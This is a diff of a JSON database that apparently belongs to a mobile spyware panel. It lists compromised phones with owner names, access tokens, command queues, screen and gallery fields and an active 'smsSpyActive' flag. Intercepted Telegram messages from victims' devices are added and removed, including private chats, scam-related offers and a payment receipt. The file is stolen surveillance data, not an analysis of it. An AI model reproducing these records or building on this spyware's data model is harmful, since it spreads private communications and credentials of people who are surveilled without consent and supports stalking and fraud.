@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776775594870,
+    "lastSeen": 1776775600762,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776775593971,
+    "lastSeen": 1776775601774,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776775593556,
+    "lastSeen": 1776775599607,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "GB CPANEL BY PRABOWO: ZEEIN STORE",
+        "content": "Rate brpa perchat nya",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775594974
+      },
+      {
+        "appName": "Telegram",
+        "sender": "./j4X¡tsme な #sa #flory 🎖️",
+        "content": "Fs Noktel \nId 1 r9k (2) nomin \nId 1 malay scam r? Dm\n@j4Xxzw",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775594933
+      },
       {
         "appName": "Telegram",
         "sender": "Hàblàr sobrè la muèrte",
@@ -14386,22 +14402,6 @@
         "time": "21/04 19:09",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776773362366
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / 08***********\n🏦 Method: DANA\n💰 Amount: Rp 3.000\n💸 Fee: Rp 158\n💵 Total Payload: Rp 3.158\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260421195845241473\n🏷️ System ID: FSCL48861429\n⏰ 21 Apr 2026 • 19:00 WIB\n\n#DEPOSIT #DANA",
-        "time": "21/04 19:09",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776773362336
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16638 pesan baru dari 114 obrolan",
-        "time": "21/04 19:09",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776773362315
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776775594123,
+    "lastSeen": 1776775602059,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
